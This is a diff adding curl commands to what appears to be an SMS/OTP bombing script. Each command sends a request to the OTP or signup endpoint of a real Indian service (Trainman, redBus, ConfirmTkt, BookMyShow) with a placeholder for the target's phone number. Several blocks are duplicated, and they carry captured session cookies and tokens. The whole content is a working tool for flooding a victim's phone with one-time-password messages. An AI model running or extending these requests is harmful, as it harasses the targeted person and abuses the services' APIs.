@@ -223,7 +223,24 @@ curl 'https://eatiko.com/public/api/custom-otp-user' \
   --data-raw '{"phone":"+91€tor"}' \
   --compressed
 
-
+curl 'https://www.trainman.in/services/user/signup?key=012562ae-60a9-4fcd-84d6-f1354ee1ea48&timestamp=1678101261969' \
+  -H 'authority: www.trainman.in' \
+  -H 'accept: application/json, text/plain, */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: multipart/form-data; boundary=----WebKitFormBoundarym9QS2xBGu82M0ZOU' \
+  -H 'cookie: _fbp=fb.1.1678101239525.1621469544; _gid=GA1.2.930425739.1678101243; _gat_gtag_UA_99163760_1=1; _ga_HM91Q9LTGY=GS1.1.1678101243.1.1.1678101249.54.0.0; _ga=GA1.2.1612900361.1678101243; _gcl_au=1.1.1069742548.1678101250' \
+  -H 'origin: https://www.trainman.in' \
+  -H 'referer: https://www.trainman.in/auth/account' \
+  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63' \
+  --data-raw $'------WebKitFormBoundarym9QS2xBGu82M0ZOU\r\nContent-Disposition: form-data; name="phone"\r\n\r\n€tor\r\n------WebKitFormBoundarym9QS2xBGu82M0ZOU\r\nContent-Disposition: form-data; name="email"\r\n\r\n\r\n------WebKitFormBoundarym9QS2xBGu82M0ZOU\r\nContent-Disposition: form-data; name="name"\r\n\r\n\r\n------WebKitFormBoundarym9QS2xBGu82M0ZOU--\r\n' \
+  --compressed
+  
 curl 'https://www.healthians.com/login' \
   -H 'authority: www.healthians.com' \
   -H 'accept: */*' \
@@ -244,6 +261,58 @@ curl 'https://www.healthians.com/login' \
   -H 'x-newrelic-id: VwMOWF5TCxABVllbAwMHV10F' \
   -H 'x-requested-with: XMLHttpRequest' \
   --data-raw 'mobile_number=€tor&template=login&countryCode=91&resend=true&_token=v8k2Nn3DnUuBgsjT1aJUWTDjVBlRKALTkD5K6vEs' \
+  --compressed
+
+
+curl 'https://www.redbus.in/help/api/cx/generateOtp' \
+  -H 'authority: www.redbus.in' \
+  -H 'accept: application/json, text/plain, */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/json;charset=UTF-8' \
+  -H 'cookie: country=IND; currency=INR; selectedCurrency=INR; language=en; defaultlanguage=en; bCore=1; defaultCountry=IND; deviceSessionId=741ee6b7-71df-49df-a5e9-bd133458e6eb; lzFlag=0; bft=1; jfpj=d02da782b4481916cf4103ac50c70b79; ak_bmsc=09FFAD3584CBEBD9DDE1308E10EA72E8~000000000000000000000000000000~YAAQLAVaaK/ZJ6eGAQAAzZ2gthOw+lj0WeBqlxn4RsjSiq2GMlyIul4thg6A7bV+fjZ5NEoevzPGU+dB3uZSzXOIWbHYXdF+wVTKxDUdP2Sqsqt+yVAXy6i02EAxBGrnD8hFTjoV6qq1O2CUxYOzMjoHHJCAZeZRROcy6sXL1+2KeYhnOlYDTL4LCdSah+zTDonulBNxYO5Y8Tgit9Mdn1H0+6wYbfFoRDhBfWcR2wCfUaYE6Dh7kAxYGXZkU+CnznT3FbTIVJbCfA77Zqf3AhiRAtXMBl+fyBMysjtSsJNxdsnodVqlNyLrpe8IKE0k2SAa1BYiQWuWVE8z0ZNfX86c3aGWyYg0ESdto3J8hcHqHBdVB89xQKo+gnvR5Q8jrc+M6aq5P04XkZoCVG/MA0kOKS543Qzk82CPTUzmQW3YixkknodLkJD5n57opXpXL0qCJgz9oTPfqFkVnhf9AVf7fYzJcV/wh1hDHd40lRTrj+b6OzC4nOsatA==; rb_fpData=%7B%22browserName%22%3A%22Chrome%22%2C%22browserVersion%22%3A%22110.0.0.0%22%2C%22os%22%3A%22Windows%22%2C%22osVersion%22%3A%2210%22%2C%22screenSize%22%3A%221536%2C824%22%2C%22screenDPI%22%3A1.25%2C%22screenResolution%22%3A%221920x1080%22%2C%22screenColorDepth%22%3A24%2C%22aspectRatio%22%3A%2216%3A9%22%2C%22systemLanguage%22%3A%22en-US%22%2C%22connection%22%3A%224g%22%2C%22userAgent%22%3A%22mozilla/5.0%20%28windows%20nt%2010.0%3B%20win64%3B%20x64%29%20applewebkit/537.36%20%28khtml%2C%20like%20gecko%29%20chrome/110.0.0.0%20safari/537.36%20edg/110.0.1587.63%7CWin32%7Cen-US%22%2C%22timeZone%22%3A5.5%7D; _gcl_au=1.1.868109432.1678101069; tvc_smc_bus=google / organic / (not set); tvc_session_alive_bus=1; _ga=GA1.2.1884233577.1678101069; _gid=GA1.2.976903032.1678101069; mriClientId=ea210a77-43dd-41ec-8202-67949e57d7a4-KSvCJicwOQLQ429R6Z%2F6Kg%3D%3D; mriSessionId=2615d9f5-8378-4cf2-9825-a04d37e07f2c-CRFLxMd1Fh273840E6lrp-eg%231M%3D; mriClientIdSetDate=3%2F6%2F23%2011%3A13%3A46%20AM; isBrowserFP=true; gClId=1884233577.1678101069; channel_name=MOBILE_WEB; BusinessUnit=BUS; _gat_UA-9782412-15=1; _dc_gtm_UA-9782412-15=1; bm_sv=B1991E05133992544C2BA93862B1D885~YAAQLAVaaKnbJ6eGAQAAq/6hthMX5A9vijQxyiCXyjjohRMJA1VQ2AHhIiD8JQnCrU19lo1PsXUxdNPER0QcjpT8M/XaYkcSOCCcsz3txupnV+F+2eSr7hgbp2BMLscwc1CS4wK/ev/UiCooYIF+hUAwtFpFlPLh+/jqKpxl7sGLrf7t6QMppztr7+TVCfMXqQDqVJBbic0iRCPbF/u9GR/UQM4QoGdvdJp0UhEvbOHJCBpTks7V6e7XW+JDc4I=~1' \
+  -H 'origin: https://www.redbus.in' \
+  -H 'referer: https://www.redbus.in/help/login' \
+  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63' \
+  --data-raw '{"mobileNo":"€tor","phoneCode":"91"}' \
+  --compressed
+  
+  curl 'https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=€tor&newOtp=true&retry=false&testparamsp=true' \
+  -H 'Accept: */*' \
+  -H 'Accept-Language: en-US,en;q=0.9' \
+  -H 'Connection: keep-alive' \
+  -H 'Origin: https://www.confirmtkt.com' \
+  -H 'Referer: https://www.confirmtkt.com/' \
+  -H 'Sec-Fetch-Dest: empty' \
+  -H 'Sec-Fetch-Mode: cors' \
+  -H 'Sec-Fetch-Site: same-site' \
+  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63' \
+  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  --compressed
+  
+  curl 'https://in.bookmyshow.com/pwa/api/uapi/otp/send' \
+  -H 'authority: in.bookmyshow.com' \
+  -H 'accept: application/json' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/json' \
+  -H 'cookie: bmsId=1.221470887.1678100437156; __cf_bm=2U9tHN5DwXLbsge7ZY1Tt.J7sG9CVl70pij_9L52F3E-1678100437-0-ASXPDRF5HpdswF+EPZjqT84ktOlAfsAUuwackpa1qc806z/SapE4EUGg55pXZAq167Xufpfhla2SFvIkFiF/feY=; __cfruid=cfd70e72d55189ce6559ebe01a300e12af31e424-1678100437; _cfuvid=b7KvNWb310RsJ_obt5EvtE9Xy2W.Gh0hJSg4ftzdxJc-1678100437263-0-604800000; _gcl_au=1.1.163638887.1678100285; _ga=GA1.1.1442991993.1678100289; _fbp=fb.1.1678100294712.174760076; preferences=%7B%22ticketType%22%3A%22M-TICKET%22%7D; sessionId=1678100296488; WZRK_G=efd86814e0a0437585c0f37cc82a4101; WZRK_S_RK4-47R-98KZ=%7B%22p%22%3A1%2C%22s%22%3A1678100452%2C%22t%22%3A1678100297%7D; AMP_TOKEN=%24NOT_FOUND; tvc_bmscookie=GA1.2.1442991993.1678100289; tvc_bmscookie_gid=GA1.2.1230276034.1678100300; G_ENABLED_IDPS=google; _ga_84T5GTD0PC=GS1.1.1678100288.1.1.1678100312.36.0.0; rgn=%7B%22regionNameSlug%22%3A%22national-capital-region-ncr%22%2C%22regionCodeSlug%22%3A%22ncr%22%2C%22regionName%22%3A%22Delhi-NCR%22%2C%22regionCode%22%3A%22NCR%22%2C%22subName%22%3A%22%22%2C%22subCode%22%3A%22%22%2C%22Lat%22%3A%2228.6139%22%2C%22Long%22%3A%2277.209%22%7D' \
+  -H 'origin: https://in.bookmyshow.com' \
+  -H 'referer: https://in.bookmyshow.com/explore/home/national-capital-region-ncr' \
+  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
+  -H 'sec-ch-ua-mobile: ?1' \
+  -H 'sec-ch-ua-platform: "Android"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.63' \
+  --data-raw '{"channel":"phone","subChannel":"sms","details":{"phone":"€tor","origin":"https://in.bookmyshow.com"}}' \
   --compressed
 
 curl 'https://api.penpencil.co/v1/users/resend-otp?smsType=1' \
@@ -800,6 +869,59 @@ curl 'https://login.web.ajio.com/api/auth/generateLoginOTP' \
   --data-raw '{"mobileNumber":"€tor"}' \
   --compressed
 
+
+
+curl 'https://www.redbus.in/help/api/cx/generateOtp' \
+  -H 'authority: www.redbus.in' \
+  -H 'accept: application/json, text/plain, */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/json;charset=UTF-8' \
+  -H 'cookie: country=IND; currency=INR; selectedCurrency=INR; language=en; defaultlanguage=en; bCore=1; defaultCountry=IND; deviceSessionId=741ee6b7-71df-49df-a5e9-bd133458e6eb; lzFlag=0; bft=1; jfpj=d02da782b4481916cf4103ac50c70b79; ak_bmsc=09FFAD3584CBEBD9DDE1308E10EA72E8~000000000000000000000000000000~YAAQLAVaaK/ZJ6eGAQAAzZ2gthOw+lj0WeBqlxn4RsjSiq2GMlyIul4thg6A7bV+fjZ5NEoevzPGU+dB3uZSzXOIWbHYXdF+wVTKxDUdP2Sqsqt+yVAXy6i02EAxBGrnD8hFTjoV6qq1O2CUxYOzMjoHHJCAZeZRROcy6sXL1+2KeYhnOlYDTL4LCdSah+zTDonulBNxYO5Y8Tgit9Mdn1H0+6wYbfFoRDhBfWcR2wCfUaYE6Dh7kAxYGXZkU+CnznT3FbTIVJbCfA77Zqf3AhiRAtXMBl+fyBMysjtSsJNxdsnodVqlNyLrpe8IKE0k2SAa1BYiQWuWVE8z0ZNfX86c3aGWyYg0ESdto3J8hcHqHBdVB89xQKo+gnvR5Q8jrc+M6aq5P04XkZoCVG/MA0kOKS543Qzk82CPTUzmQW3YixkknodLkJD5n57opXpXL0qCJgz9oTPfqFkVnhf9AVf7fYzJcV/wh1hDHd40lRTrj+b6OzC4nOsatA==; rb_fpData=%7B%22browserName%22%3A%22Chrome%22%2C%22browserVersion%22%3A%22110.0.0.0%22%2C%22os%22%3A%22Windows%22%2C%22osVersion%22%3A%2210%22%2C%22screenSize%22%3A%221536%2C824%22%2C%22screenDPI%22%3A1.25%2C%22screenResolution%22%3A%221920x1080%22%2C%22screenColorDepth%22%3A24%2C%22aspectRatio%22%3A%2216%3A9%22%2C%22systemLanguage%22%3A%22en-US%22%2C%22connection%22%3A%224g%22%2C%22userAgent%22%3A%22mozilla/5.0%20%28windows%20nt%2010.0%3B%20win64%3B%20x64%29%20applewebkit/537.36%20%28khtml%2C%20like%20gecko%29%20chrome/110.0.0.0%20safari/537.36%20edg/110.0.1587.63%7CWin32%7Cen-US%22%2C%22timeZone%22%3A5.5%7D; _gcl_au=1.1.868109432.1678101069; tvc_smc_bus=google / organic / (not set); tvc_session_alive_bus=1; _ga=GA1.2.1884233577.1678101069; _gid=GA1.2.976903032.1678101069; mriClientId=ea210a77-43dd-41ec-8202-67949e57d7a4-KSvCJicwOQLQ429R6Z%2F6Kg%3D%3D; mriSessionId=2615d9f5-8378-4cf2-9825-a04d37e07f2c-CRFLxMd1Fh273840E6lrp-eg%231M%3D; mriClientIdSetDate=3%2F6%2F23%2011%3A13%3A46%20AM; isBrowserFP=true; gClId=1884233577.1678101069; channel_name=MOBILE_WEB; BusinessUnit=BUS; _gat_UA-9782412-15=1; _dc_gtm_UA-9782412-15=1; bm_sv=B1991E05133992544C2BA93862B1D885~YAAQLAVaaKnbJ6eGAQAAq/6hthMX5A9vijQxyiCXyjjohRMJA1VQ2AHhIiD8JQnCrU19lo1PsXUxdNPER0QcjpT8M/XaYkcSOCCcsz3txupnV+F+2eSr7hgbp2BMLscwc1CS4wK/ev/UiCooYIF+hUAwtFpFlPLh+/jqKpxl7sGLrf7t6QMppztr7+TVCfMXqQDqVJBbic0iRCPbF/u9GR/UQM4QoGdvdJp0UhEvbOHJCBpTks7V6e7XW+JDc4I=~1' \
+  -H 'origin: https://www.redbus.in' \
+  -H 'referer: https://www.redbus.in/help/login' \
+  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63' \
+  --data-raw '{"mobileNo":"€tor","phoneCode":"91"}' \
+  --compressed
+  
+  curl 'https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=€tor&newOtp=true&retry=false&testparamsp=true' \
+  -H 'Accept: */*' \
+  -H 'Accept-Language: en-US,en;q=0.9' \
+  -H 'Connection: keep-alive' \
+  -H 'Origin: https://www.confirmtkt.com' \
+  -H 'Referer: https://www.confirmtkt.com/' \
+  -H 'Sec-Fetch-Dest: empty' \
+  -H 'Sec-Fetch-Mode: cors' \
+  -H 'Sec-Fetch-Site: same-site' \
+  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.63' \
+  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  --compressed
+  
+  curl 'https://in.bookmyshow.com/pwa/api/uapi/otp/send' \
+  -H 'authority: in.bookmyshow.com' \
+  -H 'accept: application/json' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/json' \
+  -H 'cookie: bmsId=1.221470887.1678100437156; __cf_bm=2U9tHN5DwXLbsge7ZY1Tt.J7sG9CVl70pij_9L52F3E-1678100437-0-ASXPDRF5HpdswF+EPZjqT84ktOlAfsAUuwackpa1qc806z/SapE4EUGg55pXZAq167Xufpfhla2SFvIkFiF/feY=; __cfruid=cfd70e72d55189ce6559ebe01a300e12af31e424-1678100437; _cfuvid=b7KvNWb310RsJ_obt5EvtE9Xy2W.Gh0hJSg4ftzdxJc-1678100437263-0-604800000; _gcl_au=1.1.163638887.1678100285; _ga=GA1.1.1442991993.1678100289; _fbp=fb.1.1678100294712.174760076; preferences=%7B%22ticketType%22%3A%22M-TICKET%22%7D; sessionId=1678100296488; WZRK_G=efd86814e0a0437585c0f37cc82a4101; WZRK_S_RK4-47R-98KZ=%7B%22p%22%3A1%2C%22s%22%3A1678100452%2C%22t%22%3A1678100297%7D; AMP_TOKEN=%24NOT_FOUND; tvc_bmscookie=GA1.2.1442991993.1678100289; tvc_bmscookie_gid=GA1.2.1230276034.1678100300; G_ENABLED_IDPS=google; _ga_84T5GTD0PC=GS1.1.1678100288.1.1.1678100312.36.0.0; rgn=%7B%22regionNameSlug%22%3A%22national-capital-region-ncr%22%2C%22regionCodeSlug%22%3A%22ncr%22%2C%22regionName%22%3A%22Delhi-NCR%22%2C%22regionCode%22%3A%22NCR%22%2C%22subName%22%3A%22%22%2C%22subCode%22%3A%22%22%2C%22Lat%22%3A%2228.6139%22%2C%22Long%22%3A%2277.209%22%7D' \
+  -H 'origin: https://in.bookmyshow.com' \
+  -H 'referer: https://in.bookmyshow.com/explore/home/national-capital-region-ncr' \
+  -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
+  -H 'sec-ch-ua-mobile: ?1' \
+  -H 'sec-ch-ua-platform: "Android"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.63' \
+  --data-raw '{"channel":"phone","subChannel":"sms","details":{"phone":"€tor","origin":"https://in.bookmyshow.com"}}' \
+  --compressed
+  
 
 curl 'https://api.penpencil.co/v1/users/resend-otp?smsType=2' \
   -H 'sec-ch-ua: "Chromium";v="110", "Not A(Brand";v="24", "Microsoft Edge";v="110"' \
